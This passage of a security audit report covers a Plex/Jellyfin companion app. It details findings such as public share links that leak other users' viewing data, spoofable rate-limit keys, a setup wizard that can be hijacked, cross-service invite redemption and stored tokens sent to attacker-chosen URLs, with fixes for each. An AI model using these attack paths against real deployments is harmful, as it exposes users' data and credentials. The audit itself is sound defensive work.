- **Where:** `lib/auth.ts:286-288`, `actions/admin/admin-servers.ts:630-648`, `app/(app)/page.tsx:33`, `components/admin/settings/JellyfinLoginToggle.tsx:38-55`
- **Evidence:** `authorize()` looks up `prisma.jellyfinServer.findFirst({ where: { isActive: true } })` and never checks `enabledForLogin`. Only the home page reads that flag (`where: { isActive: true, enabledForLogin: true }`).
- **Impact:** an admin who hides Jellyfin login still has a working Jellyfin sign-in endpoint, which keeps the SEC-08 path open.
- **Verifier correction:** the docstring and UI label it explicitly as visibility ("Hide from Login"), so this is defence in depth. The column name invites the wrong assumption.
- **Recommendation:** enforce `enabledForLogin` in the Jellyfin `authorize()` by returning null when it is false, or rename the field and setting to make clear it is visibility-only.
- **Effort:** S

#### SEC-15: Development and test paths are gated only by `NODE_ENV` (test-token login, `getDevDefaults`, destructive seed)

- **Severity:** Low
- **Status:** adjusted
- **Sources:** AUTH-13, SEC-INFRA-18
- **Where:** `lib/auth.ts:40-43`, `:51`, `:54-58`, `:107-109`; `actions/dev-defaults.ts:104-123`, `:128-240`; `prisma/seed.ts:13-16`, `:28-37`; `package.json:8-10`; `docker-compose.yml:20`
- **Evidence:**
  ```ts
  // lib/auth.ts:40-43
  const isTestMode = process.env.NODE_ENV !== 'production' &&
    (process.env.NODE_ENV === 'test' || process.env.ENABLE_TEST_AUTH === 'true')
  ```
  - **Test login:** `NODE_ENV=test` alone enables the `TEST_ADMIN_TOKEN` login.
  - **Dev defaults:** `getDevDefaults` is an unauthenticated server action. It returns `DEV_PLEX_TOKEN`, `DEV_*_API_KEY`, the Discord client secret and the LLM key whenever `NODE_ENV === "development"`.
  - **Seed:** `prisma/seed.ts` only refuses `NODE_ENV === 'production'`. It then runs `deleteMany()` across users and config and creates an admin.
- **Impact:** a server run with `next dev` or `NODE_ENV=test` under `next start` exposes the developer's DEV_* secrets to anyone who can reach it, plus a test-login path. Running `npm run db:seed` against a production `DATABASE_URL` wipes users and configuration.
- **Verifier corrections:**
  - Test mode rejects every real token, and `TEST_ADMIN_TOKEN` only works if a seeded `admin@example.com` admin exists.
  - `getDevDefaults` returns only DEV_* env vars, not secrets stored in the DB.
  - The standalone `server.js` forces production.
  - Prisma 7.2 no longer auto-seeds on `migrate dev` / `migrate reset`, and the runner image cannot run the seed.
- **Recommendation:**
  - Gate test auth only on an explicit `ENABLE_TEST_AUTH=true`, with a loud warning at startup.
  - Have `getDevDefaults` return only non-secret prefill values (booleans for secrets), or return nothing once setup is complete.
  - Make the seed refuse unless the DB host is localhost, 127.0.0.1 or `db`, or `ALLOW_DESTRUCTIVE_SEED=true` is set, and have it print the target host first.
  - Remove the stale `package.json` `prisma.seed` block and the `SKIP_SEED` handling.
- **Effort:** S

### 3. Data exposure and privacy

#### SEC-16: Public Rewind share links expose other users' viewing data and server stats; sharing is automatic and can never be revoked

- **Severity:** High
- **Status:** verified
- **Sources:** WEB-02, plus the email-fallback parts of AUTH-14 and SEC-INFRA-17
- **Where:** `app/api/wrapped/share/[token]/route.ts:31-43`, `:74-76`, `:85`, `:87`; `app/(app)/wrapped/share/[token]/page.tsx:61-84`, `:108-117`; `components/wrapped/wrapped-share-summary.tsx:1`; `app/api/wrapped/og-image/route.tsx:75`; `types/wrapped.ts:41-86`; `lib/wrapped/tautulli-leaderboards.ts:68-80`, `:205-213`; `lib/wrapped/assemble-wrapped.ts:228-237`; `actions/wrapped-generation.ts:136`, `:241-301`, `:323-333`; `actions/playground-wrapped.ts:104`; `prisma/schema.prisma:180`
- **Evidence:**
  ```ts
  // app/api/wrapped/share/[token]/route.ts:85-87
  userName: wrapped.user.name || wrapped.user.email || "User",
  data: wrappedData,          // entire stored JSON, including statistics.leaderboards
  // actions/wrapped-generation.ts:136
  const shareToken = existingWrapped?.shareToken || generateShareToken()
  ```
  - **What the stored JSON contains:**
    - `leaderboards.topContent`: every Tautulli user who watched the sharer's top titles, with `userId`, `username`, `friendlyName`, `watchTime` and `playCount`;
    - `watchTime.leaderboard`: every active user's yearly watch time;
    - `serverStats`, `overseerrStats.totalServerRequests` and the internal `userId`.
  - **Exposed in the page too:** the page passes the raw `WrappedData` to a `'use client'` component, so all of it is serialised into the RSC payload.
  - **Email fallback:** the OG image falls back to the email.
  - **Never revocable:** no code ever sets `shareToken` to null, there is no expiry field and no delete path, and the page sets no `noindex`.
- **Impact:** when a member shares their Rewind, as the feature intends (with Twitter/OG cards), anyone holding the link can see which other members watched those titles, for how long and under what names. That includes crawlers and link-unfurl bots, and none of those members consented. The sharer cannot unshare. The data is not rendered on screen; it can be read from the JSON API or the RSC payload.
- **Scenario:**
  1. Member A generates a Rewind, which mints a share token automatically.
  2. A posts the link to social media.
  3. A viewer runs `curl /api/wrapped/share/<token>` and reads `data.statistics.leaderboards.topContent.movies[i].leaderboard`, for example `[{friendlyName:"Jane Smith", username:"jsmith", watchTime:412, playCount:3}, ...]`.
- **Recommendation:**
  - Define a public share DTO with a Zod schema, containing only the sharer's own stats and their rank or percentile. Drop leaderboard entries, user IDs and internal IDs, and never fall back to email.
  - Render the share page from that server-side projection.
  - Make sharing opt-in (mint the token when the user clicks Share), add revoke and rotate actions plus an optional expiry, and send `X-Robots-Tag: noindex`.
- **Effort:** M

#### SEC-17: The "User not found in Tautulli" error returns every server user's username and email to the caller

- **Severity:** Medium
- **Status:** confirmed. Two verifiers raised it independently while checking SEC-28 and SEC-22, and the code was re-read for this report.
- **Sources:** verifier notes on AUTH-03 and AI-01
- **Where:** `lib/wrapped/tautulli-user-statistics.ts:103-112`, `actions/wrapped-generation.ts:381-398`
- **Evidence:**
  ```ts
  // lib/wrapped/tautulli-user-statistics.ts:104-111
  const availableUsers = users.map((u: TautulliUser) =>
    `${u.username || u.friendly_name || "Unknown"} (${u.email || "no email"})`).join(", ")
  error: `User not found in Tautulli. ... Available users: ${availableUsers || "none"}`
  ```
  `generatePlexWrapped` returns `error.message` to the caller and also stores it in `PlexWrapped.error`.
- **Impact:** any signed-in Plex user that Tautulli does not know gets the username and email of every user on the server. That includes a gated non-member when Stripe is on (anyone with a Plex account), and a new invitee with no history.
- **Recommendation:** return a fixed message ("Your account was not found in Tautulli yet"). Log the candidate list server-side only, at debug level, without emails. The generic error helper is covered under SEC-20.
- **Effort:** S

#### SEC-18: Admin invite actions return full User rows, including `plexAuthToken`, to the browser

- **Severity:** Medium
- **Status:** confirmed
- **Sources:** AUTH-11, SEC-INFRA-06
- **Where:** `actions/invite.ts:453-473`, `:478-498`; `components/admin/invites/invites-page-client.tsx:131`; `components/admin/invites/invite-details-client.tsx:41`; `lib/prisma.ts:17-21`, `:80-84`, `:104-109`; `lib/security/crypto.ts:80-84`; `app/(app)/page.tsx:27-38`
- **Evidence:**
  ```ts
  // actions/invite.ts:458-466 and :483-492
  include: { usages: { include: { user: true } } }
  // lib/prisma.ts:81-84
  const fields = model ? ENCRYPTED_FIELDS[model] : undefined; if (!fields) { return query(args) }
  ```
  - **The encryption extension is skipped:** Prisma query extensions do not run on nested relation reads, so nested `User` rows arrive exactly as stored. With `ENCRYPTION_KEY` unset (the default), that is the plaintext plex.tv token; with the key set, it is ciphertext.
  - **Over-fetching elsewhere:** the home page decrypts PlexServer, Overseerr and DiscordIntegration rows on every render, but passes on only non-secret fields.
- **Impact:** every invitee's plex.tv account token, which gives full access to their own Plex account, is sent in the admin pages' RSC payload. From there it can end up in devtools, HAR files, browser extensions or any admin-page XSS, and it reaches secondary admins. Any future nested include of a secret model silently leaks it, or returns ciphertext where plaintext is expected.
- **Recommendation:**
  - Use `select: { id: true, name: true, email: true, image: true }` for `usages.user`.
  - Configure Prisma's global `omit` for every `ENCRYPTED_FIELDS` column, so a query must opt in to read a secret.
  - Add a test asserting that no server-action result contains an encrypted field, and document the limitation of the nested-read path.
- **Effort:** S

#### SEC-19: Public and low-privilege server actions leak small amounts of data or accept unbounded parameters

- **Severity:** Low
- **Status:** confirmed
- **Sources:** AUTH-14, AI-05 (`getActivePromptTemplate`), WEB-09 and AUTH-06 (`fetchLLMModels`), SEC-INFRA-12 verifier note (`checkServerAccess` delay)
- **Where:** `actions/user-queries.ts:526-535`; `lib/guards.ts:1`, `:20`; `actions/auth.ts:12`, `:133`, `:214-236`; `actions/invite.ts:531-555`; `actions/prompts.ts:53-59`; `actions/onboarding.ts:152`; `app/(app)/page.tsx:102-104`; `actions/setup.ts:546-575`
- **Evidence:**
  - **IDOR:** `getUserFirstWatchDate(plexUserId, userEmail)` checks only that a session exists, then queries Tautulli for any ID or email the caller supplies. That makes it an IDOR and an email/membership oracle.
  - **Entitlement oracle:** `getAccessGateStatus(userId)` is exported from a `'use server'` file. It needs a non-enumerable cuid, so the impact is negligible.
  - **Unbounded delay:** `checkServerAccess` is unauthenticated and honours a caller-supplied `retryOptions.initialDelay` with no cap (`await waitForDelay(initialDelay)`), before any token check. Retries are capped at 3 minutes.
  - **Full invite row:** `validateInvite` returns `{ success: true, data: invite }`, the whole row including `createdBy` and library IDs, to anyone holding the code.
  - **Prompt template:** `getActivePromptTemplate` is the only export in `actions/prompts.ts` without `requireAdmin`.
  - **Internal URLs:** `getOnboardingInfo` falls back to the internal Overseerr URL. The home page passes `plexServer?.url` even though `publicUrl` exists, which is also a correctness bug.
  - **OpenAI key oracle:** `fetchLLMModels` is unauthenticated after setup and validates any OpenAI key against a fixed endpoint. It is an oracle, not SSRF.
- **Impact:** small cross-user disclosures (first-watch dates, Tautulli membership by email), exposure of internal network topology and the admin's prompt design, an anonymous OpenAI key checker, and a cheap way to hold server requests open.
- **Recommendation:**
  - `getUserFirstWatchDate`: derive the ID and email from the session.
  - `getAccessGateStatus` and `getActivePromptTemplate`: move them into `server-only` modules.
  - `checkServerAccess`: clamp `initialDelay`, or accept only an `isInviteFlow` boolean.
  - `validateInvite`: return only `{ serverType, expiresAt }`.
  - Return only `publicUrl` values to non-admins.
  - Gate `fetchLLMModels` with `requireAdminIfSetupComplete`.
- **Effort:** S

#### SEC-20: Raw internal error messages are returned to clients, including from the unauthenticated `checkServerAccess`

- **Severity:** Low
- **Status:** confirmed
- **Sources:** SEC-INFRA-12, AI-08 (user-facing error part)
- **Where:** `actions/auth.ts:214`, `:312-318`; `actions/wrapped-generation.ts:348`, `:381`, `:392`; `actions/user-marks.ts:55`, `:111`, `:151`; `actions/discord.ts:143`, `:166`, `:187`; `actions/admin/admin-servers.ts:61-63`, `:144-147`; `actions/server-info.ts:111`; `actions/setup.ts:579-581`; `actions/admin/admin-config.ts:186`, `:268`, `:441`, `:516`; `lib/security/error-handler.ts:24-42`; `components/wrapped/user-wrapped-viewer.tsx:55`; `components/dashboard/wrapped-card.tsx:117`, `:141`; `lib/wrapped/api-calls.ts:172`
- **Evidence:**
  - **Unauthenticated path:** `checkServerAccess` has no guard and returns `error instanceof Error ? error.message : "Failed to check server access"`.
  - **The pattern is widespread:** `error instanceof Error ? error.message` appears 45 times under `actions/`, and about 51 `lib/connections` sites interpolate `${error.message}`.
  - **Stored and shown:** Rewind errors, including OpenAI's `errorData.error?.message`, are stored in `PlexWrapped.error` and shown to the user in a toast.
  - **The helper exists but is unused:** `createSafeError` is used only by API routes.
- **Impact:** unauthenticated and regular users can see Prisma connection errors such as "Can't reach database server at db:5432", the decrypt misconfiguration text, internal hostnames and upstream error bodies. This helps an attacker fingerprint the system and contradicts the CLAUDE.md convention of returning `{ error: 'Operation failed' }`.
- **Recommendation:** add a `toActionError(error, fallback)` helper that logs the full error and returns a stable generic message plus an error code or request ID. Use it in every `'use server'` catch block, show upstream detail to admins only, and add a lint or grep check against the raw pattern.
- **Effort:** M

#### SEC-21: Poster proxy marks session-gated responses `public` and lets any session fetch any library item

- **Severity:** Low
- **Status:** confirmed
- **Sources:** WEB-12
- **Where:** `app/api/wrapped/poster/[ratingKey]/route.ts:13`, `:27-36`, `:73-85`, `:121`
- **Evidence:**
  - The response is sent with `"Cache-Control": "public, max-age=86400, s-maxage=86400"` after a check that required `getServerSession` or a share token.
  - Any session passes, with no library or subscription check.
  - Each share-token request runs `findUnique` plus `JSON.parse(wrapped.data)`.
- **Impact:** a shared cache in front of the app (a Cloudflare "Cache Everything" rule, nginx `proxy_cache`) can serve posters to anonymous requests. Users restricted to some libraries can still pull artwork from all of them, and each share view triggers 10 to 20 full JSON parses. Only poster art leaks.
- **Recommendation:** send `Cache-Control: private, max-age=86400` for session-authenticated responses (`private` rather than `Vary: Cookie`, which many CDNs ignore), and use `public` only for share-token requests. Cache each token's allowed rating-key set, or store it in its own column.
- **Effort:** S

### 4. Abuse controls and rate limiting

#### SEC-22: Any user can trigger unbounded, concurrent Rewind LLM generations (any year 2010-2100, re-triggered while "generating", no rate limit or entitlement check)

- **Severity:** High (AUTH-05's verifier rated the same issue medium; the AI-01 pipeline kept high after the refutation attempt)
- **Status:** verified
- **Sources:** AI-01, AUTH-05
- **Where:** `actions/wrapped-generation.ts:36`, `:54-57`, `:83`, `:101-122`, `:139-158`, `:304-310`; `lib/validations/shared-schemas.ts:30`; `actions/admin/admin-config.ts:74-77`; `lib/wrapped/tautulli-user-statistics.ts:136-191`; `components/dashboard/wrapped-card.tsx:137`; `components/wrapped/wrapped-home-button.tsx:102`
- **Evidence:**
  ```ts
  // lib/validations/shared-schemas.ts:30
  yearSchema = z.number().int().min(2010).max(2100)
  // actions/wrapped-generation.ts:112-117
  } else { // Generating status - allow user to retry their own ... if (!isOwnWrapped && !isAdmin) return ...
  ```
  - **Exposed to every user:** the action is imported by client components, so its ID ships to every logged-in user.
  - **Only completed records are protected:** only a `completed` record blocks a non-admin. A `failed` or `generating` record is let through for the owner. The status read (`:83`) and the upsert back to "generating" (`:139`) are separate operations with no compare-and-set.
  - **Year not bound:** the requested year is never compared to `wrappedYear`.
  - **No limits:** there is no `checkRateLimit`, lock or `getAccessGateStatus` call.
  - **Full scan every time:** `fetchTautulliStatistics` pages the user's entire history with no date filter, and an empty year still goes on to an LLM call.
- **Impact:** during the Rewind window, an invited user, or a lapsed subscriber who still has a session, can loop over 91 years and fire about 50 concurrent calls per year. Each call is a full Tautulli/Plex pull plus a paid LLM request on the operator's key (gpt-5.5 is priced at $5/$30 per 1M tokens in `lib/llm/pricing.ts`). The result: unbounded spend, Tautulli and worker DoS, OpenAI rate limits that break Rewind for everyone, and rows overwritten by racing writes. Only an OpenAI org budget cap bounds it.
- **Verifier note:** a never-member gated user fails at the Tautulli lookup before any LLM call (but see SEC-17).
- **Recommendation:**
  - Make the transition to "generating" atomic (`updateMany` with a status condition).
  - Add a per-user rate limit, and restrict `year` to the configured Rewind year (or the current and previous year).
  - Skip the LLM call when watch time is zero, and bound the Tautulli scan with `after`/`before`.
  - Move generation into a BullMQ job with a deterministic `jobId` (see SEC-43).
- **Effort:** S

#### SEC-23: No per-user rate limits, quotas or spend cap on LLM and expensive Discord surfaces; failed LLM calls are not recorded

- **Severity:** Medium
- **Status:** confirmed
- **Sources:** AI-02, AI-08 (LLMUsage part)
- **Where:** `lib/discord/services.ts:112-181`; `lib/discord/routing/dm-router.ts:170-185`; `lib/discord/commands/assistant.ts:70-84`; `actions/chatbot/conversation.ts:48`, `:78-101`; `lib/wrapped/api-calls.ts:194-217`; `lib/wrapped/llm.ts:112-114`, `:127`; `actions/discord.ts:171-190`; `lib/discord/commands/mystats.ts:148`
- **Evidence:**
  - **No throttle anywhere:** a grep for `rate.?limit|quota|budget|spend|dailyLimit` across `lib/discord`, `lib/chatbot`, `actions/chatbot`, `lib/wrapped` and `lib/llm` finds only a comment.
  - **Up to five LLM calls per message:** `handleDiscordChat` goes straight from the entitlement check to the chatbot, which allows `MAX_LOOPS = 5` LLM calls per message.
  - **Failed generations are invisible:** `callOpenAI` returns without `tokenUsage` on truncation or schema failure, and LLMUsage is written only `if (llmResult.tokenUsage)`.
  - **Unthrottled full-history scans:** `resyncDiscordRole` and `/mystats` each run one on demand.
- **Impact:** any linked, entitled Discord member can script DMs that each burn up to 5 OpenAI calls on the admin's key. Cost dashboards under-report real spend, so abuse or failure loops go unnoticed, and repeated full-history scans degrade Tautulli. Discord's own rate limits slow this down.
- **Recommendation:**
  - Add a Redis-backed limiter per user for Discord DMs and the assistant, the chatbot, Rewind and resync.
  - Add a configurable daily token or cost quota per user and a global monthly cap, checked against LLMUsage before each call. Fail closed with a friendly message.
  - Record LLMUsage with `status=failed` for every billed call.
- **Effort:** M

#### SEC-24: No rate limiting on sensitive unauthenticated endpoints (Jellyfin password login, invite validation and redemption, Plex PIN actions)

- **Severity:** Medium
- **Status:** confirmed
- **Sources:** WEB-09, AUTH-12 (rate-limit part), AUTH-16 (rate-limit part)
- **Where:** `lib/security/rate-limit.ts:144`; `app/api/auth/[...nextauth]/route.ts:4`; `lib/auth.ts:277`; `actions/invite.ts:411`, `:531`, `:580`, `:784`; `lib/plex-auth.ts:43`, `:71`
- **Evidence:**
  ```ts
  export const authRateLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 10 }) // only referenced by its test
  export { handler as GET, handler as POST }                                     // NextAuth route, unwrapped
  ```
  - **Jellyfin login:** the Jellyfin `authorize` forwards every attempt to Jellyfin.
  - **Invite validation:** `validateInvite` is unauthenticated, returns distinct errors, and is not throttled.
  - **Custom codes:** admin-chosen codes accept any length (`options.code?.trim().toUpperCase()`).
  - **Redemption and PIN actions:** `processInvite`, `processJellyfinInvite`, `createPlexPin` and `getPlexAuthToken` have no limiter.
- **Impact:** unlimited online password guessing against Jellyfin accounts through the app, which also turns Jellyfin's per-user lockout into a DoS against legitimate users. Short custom invite codes (for example "FRIENDS") can be guessed at full speed, granting server access plus a Stripe exemption. The unthrottled PIN actions make SEC-11 easier.
- **Verifier note:** generated codes are 8 characters from a 32-symbol alphabet via `crypto.randomInt` (about 40 bits), so only custom codes are practically guessable. `processInvite` needs a valid plex.tv token before it consumes anything, so `validateInvite` is the cheap guessing oracle.
- **Recommendation:**
  - After fixing SEC-25, wrap the NextAuth POST handler with `authRateLimiter`, keyed per IP and per username.
  - Add `checkRateLimit` (IP from `headers()`) to `validateInvite`, `processInvite`, `processJellyfinInvite`, `createPlexPin` and `getPlexAuthToken`, and audit-log failed code lookups.
  - Enforce a minimum length for custom codes (SEC-56).
- **Effort:** S

#### SEC-25: The rate limiter is one in-memory Map keyed only by the spoofable leftmost `X-Forwarded-For` and shared by every limiter

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** WEB-04, ST-06
- **Where:** `lib/security/rate-limit.ts:15`, `:37-43`, `:48-92`, `:127`; `lib/security/ip-hash.ts:33-38`; `app/api/stripe/webhook/route.ts:22-25`, `:39-42`; `app/api/admin/models/route.ts:13-22`; `app/api/wrapped/poster/[ratingKey]/route.ts:60`
- **Evidence:**
  ```ts
  // In-memory store (for production, use Redis)
  const rateLimitStore = new Map<string, RateLimitEntry>()
  return forwarded?.split(",")[0]?.trim() || request.headers.get("x-real-ip") || "unknown"
  ```
  - **One shared counter per IP:** `shareRateLimiter` (100/15m), `posterRateLimiter` (500/15m), `adminRateLimiter` (50/15m) and the Stripe webhook limiter (120/1m) all use `key = keyGenerator(request)` with no namespace, so they increment the same count. The reset time belongs to whichever limiter created the entry.
  - **Ordering:** admin routes rate-limit before checking auth, and the webhook limiter runs before signature verification.
  - **Memory:** there is no size cap on the Map.
  - **Same flaw elsewhere:** `getHashedIP` uses the same leftmost-XFF logic.
- **Impact:**
  - **Collisions:** viewing a Rewind (about 20 posters) and then using the admin console causes false 429s.
  - **Spoofing:** behind proxies that append to XFF, the leftmost entry is client-controlled. Attackers can bypass every limit, lock a victim out by sending the victim's IP, or spoof Stripe's published IPs to get genuine webhook deliveries rejected with 429 for as long as the attack runs.
  - **Memory:** rotating keys grows the Map without bound.
  - **Scope:** counts are per instance and reset on restart, even though Redis is already deployed.
- **Verifier corrections:** medium rather than high, because the effect is bypass and partial availability loss with no data exposure. Stripe retries for up to 3 days. The "unknown" bucket is unlikely, because Next fills XFF from the socket address when it is missing.
- **Recommendation:**
  - Use a Redis-backed limiter (for example rate-limiter-flexible with the existing `REDIS_URL`).
  - Namespace keys per limiter (`share:`, `poster:`, `admin:<userId>`) and key authenticated routes by user ID.
  - Derive the client IP from a configured trusted-proxy hop count, taking the Nth entry from the right.
  - Exempt the Stripe webhook from IP limiting, or limit only after the signature is verified, and cap the body size.
- **Effort:** M

#### SEC-26: The share page fetches its own API during server rendering, so all public viewers share one rate-limit bucket

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** WEB-03
- **Where:** `app/(app)/wrapped/share/[token]/page.tsx:12-15`, `:21`, `:102`; `app/api/wrapped/share/[token]/route.ts:18`, `:56-58`; `lib/security/rate-limit.ts:37`; `lib/utils.ts:35`
- **Evidence:**
  - **The self-fetch:** `page.tsx:12-15` does `await fetch(`${baseUrl}/api/wrapped/share/${token}`, { cache: "no-store" })`.
  - **Errors become 404s:** any non-404 response throws, which ends in `notFound()`.
  - **One shared key:** the API route applies `shareRateLimiter` before the DB lookup, and the server-side fetch carries no client XFF.
  - **Wrong visitor data:** visit tracking records the server's IP hash and Node's user agent.
  - **Encoding:** the token is interpolated without encoding.
- **Impact:** about 100 renders of any `/wrapped/share/<anything>` URL in 15 minutes, including invalid tokens, make every share link on the server return 404 for everyone, and a single popular link can break itself. Share analytics are wrong, and the page only works if the container can reach its own public URL.
- **Verifier correction:** medium, not high. Only the share feature's availability is affected, and the attacker has to keep re-triggering it.
- **Recommendation:**
  - Extract a `server-only` `getSharedWrapped(token)` that queries Prisma directly and returns the SEC-16 DTO. Wrap it in React `cache()` so metadata and the page share one lookup.
  - Validate the token with Zod (base64url).
  - Do rate limiting and visit tracking in the page using the real client IP, once SEC-25 is fixed.
- **Effort:** S

### 5. Authorization and entitlement

#### SEC-27: Watchlist sync files Overseerr requests as the admin (admin API key, no `X-Api-User`), so every user's requests are auto-approved

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** AUTH-01, WL-01
- **Where:** `lib/connections/overseerr.ts:289-327`; `lib/watchlist/sync-service.ts:108-137`, `:259-281`, `:307-313`; `actions/watchlist.ts:100-160`, `:139-149`, `:174-205`; `lib/queue/client.ts:81`; `lib/queue/jobs/watchlist-sync.ts:23-41`; `components/admin/settings/watchlist-sync-settings.tsx:141-142`
- **Evidence:**
  ```ts
  // lib/connections/overseerr.ts:306-326
  POST `${config.url}/api/v1/request`  body = { mediaType, mediaId }
  headers: { "Content-Type": "application/json", "X-Api-Key": config.apiKey }   // no X-Api-User, no userId
  ```
  - **Every item is submitted:** `syncUserWatchlist` submits every watchlist item that has a TMDB id, with no cap.
  - **No quota or flag checks:** `updateWatchlistSyncSettings` and `triggerWatchlistSync` check only the session. `triggerWatchlistSync` does not re-check `Config.watchlistSyncEnabled`, and neither does the processor.
  - **No dedupe:** the manual trigger is unthrottled and enqueues without a `jobId`.
  - **Racy counters:** `updateSyncSettings` does a read-then-write of cumulative totals.
- **Impact:** once an admin enables the feature, any signed-in user can add any title to their Plex watchlist and have it requested and auto-approved through the admin account. That bypasses Overseerr approval, per-user quotas and permissions, and loses attribution (every request shows the admin). It costs the operator disk and bandwidth.
- **Verifier corrections:**
  - The feature is off by default, and its stated purpose is exactly this sync. The defect is attribution and approval bypass, not unexpected access.
  - Repeated triggers do not duplicate requests (already-requested items are skipped), so the flooding risk is API and queue load.
  - The non-member angle belongs to SEC-28.
- **Recommendation:**
  - Send `X-Api-User: <overseerrUserId>`, mapped from the user's `plexId`, and skip users with no mapped Overseerr user (no admin fallback). Alternatively, use Overseerr's native per-user watchlist auto-request (the `AUTO_REQUEST` permission).
  - Re-check the global toggle in the trigger and the processor.
  - Use a deterministic `jobId` per user plus a rate limit, cap items per sync, and use Prisma `increment` for the totals.
- **Effort:** M

#### SEC-28: Subscription entitlement is enforced only in the `(app)` layout; server actions, route handlers and jobs don't check it

- **Severity:** Medium
- **Status:** adjusted
- **Sources:** AUTH-03
- **Where:** `app/(app)/layout.tsx:47-49`; `lib/guards.ts:45-55`; `lib/auth.ts:169-190`; `actions/wrapped-generation.ts:58-62`; `actions/user-marks.ts:63`; `actions/watchlist.ts:100`, `:174`; `actions/discord.ts:171`; `actions/user-queries.ts:526`; `app/(app)/discord/connect/route.ts:18-22`; `app/api/wrapped/poster/[ratingKey]/route.ts:73-85`; `lib/watchlist/sync-service.ts:307-313`
- **Evidence:**
  - **One call site:** `getAccessGateStatus` is called from exactly one request path, `await ensureSubscriptionOrAccess()` in `app/(app)/layout.tsx:49`.
  - **Non-members get sessions by design:** `lib/auth.ts:185-189` issues full sessions to Plex non-members when `stripeEnabled` is on (`"Plex non-member allowed session (Stripe gating enabled)"`).
  - **The actions check only for a session:** `generatePlexWrapped`, `createUserMediaMark`, the watchlist actions, `resyncDiscordRole` and `getUserFirstWatchDate`.
  - **Layouts don't cover the rest:** route handlers do not inherit layouts, and layouts are not re-run on soft navigation.
  - **Background jobs:** `syncAllEnabledUsers` has no entitlement filter.
- **Impact:** with Stripe enabled, anyone with a Plex account can sign in unpaid and call paid features directly. The most material is watchlist-driven Overseerr requests (SEC-27), along with media marks, Discord linking and the poster proxy.
- **Verifier corrections:**
  - Rewind LLM spend is reachable only by lapsed members that Tautulli still knows. Never-members fail at the Tautulli lookup, which then leaks every user (SEC-17).
  - Discord linking gives little, because the bot enforces entitlement itself (`lib/discord/services.ts:81`, `:148`).
  - The poster proxy only exposes artwork.
- **Recommendation:** add `requireEntitledUser()` and call it in every non-admin, non-billing action and route handler. Add an entitlement filter to `syncAllEnabledUsers` and the `WATCHLIST_SYNC_USER` processor.
- **Effort:** M

#### SEC-29: Jellyfin invite codes can be redeemed through the Plex flow, which shares every Plex library and grants a permanent Stripe exemption

- **Severity:** Medium
- **Status:** confirmed
- **Sources:** AUTH-04
- **Where:** `actions/invite.ts:37`, `:433-435`, `:580-631`, `:828`; `lib/connections/plex-invitations.ts:104-106`; `app/auth/callback/plex/callback-client.tsx:113-114`
- **Evidence:**
  ```ts
  // actions/invite.ts:828 (Jellyfin path checks; processInvite at :580-631 does not)
  if (invite.serverType !== ServerType.JELLYFIN)
  // lib/connections/plex-invitations.ts:104-106 (JELLYFIN invites store librarySectionIds: null)
  } else { librarySectionIds = allPlexTvIds }
  // actions/invite.ts:37
  INVITE_EXEMPTION = { isExempt: true, exemptReason: "invite" }
  ```
  The Plex callback calls `processInvite(inviteCode, authToken)` with the code taken straight from the URL.
- **Impact:** whoever holds a Jellyfin invite, which may be limited to particular Jellyfin libraries, can instead get full access to every Plex library plus a permanent subscription exemption. This requires both Plex and Jellyfin to be configured.
- **Recommendation:** make `validateAndUseInvite` take an expected `serverType` and reject a mismatch before incrementing `useCount`. Never fall back to "all libraries" for an invite from another service, and add a unit test for cross-type redemption.
- **Effort:** S

#### SEC-30: Setup wizard actions are unauthenticated until setup completes, so a fresh install exposed to the internet can be hijacked

- **Severity:** Medium
- **Status:** confirmed
- **Sources:** AUTH-07, WEB-05 (pre-setup SSRF part)
- **Where:** `actions/setup.ts:38-43`, `:52`, `:59-96`, `:438`, `:529`; `lib/auth.ts:129`, `:193`; `lib/connections/plex-connection.ts:18-45`
- **Evidence:**
  ```ts
  // actions/setup.ts:38-43
  async function requireAdminIfSetupComplete() { const setupStatus = await getSetupStatus(); if (setupStatus.isComplete) { await requireAdmin() } }
  // actions/setup.ts:59, 88
  getPlexUserInfo(validated.token) ... tx.plexServer.create({ ..., adminPlexUserId, isActive: true })
  // lib/auth.ts:129, 193
  prisma.plexServer.findFirst({ where: { isActive: true } })  ...  plexServer.adminPlexUserId === plexUser.id
  ```
  - **Duplicate active rows:** setup creates a new active row without deactivating earlier ones. Tautulli, Overseerr, Sonarr, Radarr and Prometheus behave the same way; only the LLM provider deactivates first (`:438`).
  - **Ambiguous lookup:** `findFirst` has no `orderBy`.
- **Impact:** between container start and the operator finishing the wizard, anyone who reaches the URL can register their own Plex server and become the app admin, then lock the config by calling `completeSetup`. If the operator is mid-wizard, the attacker can add a second active server so admin resolution becomes nondeterministic. During that window the connection tests also give SSRF (`Connection error: ${error.message}`). Going back and resubmitting a wizard step creates duplicate active rows.
- **Recommendation:**
  - Require a one-time setup token: generate it at first boot and print it to the logs, or read `SETUP_TOKEN` from env. Store it as a hash and compare in constant time, in `requireAdminIfSetupComplete` and on `/setup`.
  - In each `save*` action, deactivate previous rows in the same transaction (or upsert a singleton).
  - Add `orderBy: { createdAt: 'desc' }` to every `isActive` `findFirst` used for auth decisions.
- **Effort:** M

### 6. Secrets and cryptography

#### SEC-31: "Leave blank to keep the current secret", combined with the connection test, sends stored tokens and API keys to a newly entered URL

- **Severity:** Medium
- **Status:** confirmed
- **Sources:** WEB-07, SEC-INFRA-07
- **Where:** `actions/admin/admin-servers.ts:17-24`, `:71-89`, `:110-114`, `:164-167`, `:237-239`, `:310-312`, `:383-385`, `:532-535`; `lib/connections/plex-connection.ts:18`; `lib/connections/tautulli.ts:13`; `actions/admin/admin-users.ts:31`; `actions/admin/admin-settings.ts:7-17`
- **Evidence:**
  ```ts
  // actions/admin/admin-servers.ts:80-89
  const token = await resolveSecret(data.token, async () => { const active = await prisma.plexServer.findFirst({ where: { isActive: true } }); return active?.token })
  ... plexServerSchema.parse({ ...data, token }) ... await testPlexConnection(validated)
  // lib/connections/plex-connection.ts:18
  `${config.url}/status/sessions?X-Plex-Token=${config.token}`
  ```
  Tautulli, Overseerr, Sonarr, Radarr and Jellyfin use the same pattern: they fall back to the active row's key, then test against the submitted URL.
- **Impact:** any admin session can recover any stored credential, including the owner's plex.tv token, by submitting a URL that points at a listener and leaving the key blank. That covers a secondary admin, a hijacked admin session, or a CSRF'd one (SEC-01). The token is sent before anything is saved, even when the test fails. This defeats the "secrets are never sent to the client" design and is not audit-logged (SEC-55).
- **Verifier note:** secondary Plex admins are reset at their next login (SEC-12), which narrows that scenario.
